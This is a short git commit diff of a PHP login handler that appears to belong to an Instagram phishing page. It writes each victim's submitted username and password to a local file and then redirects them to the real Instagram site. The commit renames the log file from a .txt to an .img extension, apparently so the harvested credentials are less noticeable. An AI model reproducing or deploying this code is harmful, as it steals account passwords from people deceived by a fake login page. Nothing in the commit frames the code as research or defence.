ce76e16e66219d196b55a55b992f0046893f0124
K.D.O <106128975+kdo2006@users.noreply.github.com>
2022-08-29 17:09:04 +0545

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,7 @@
 <?php
 
-file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.img", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
+
 ?>
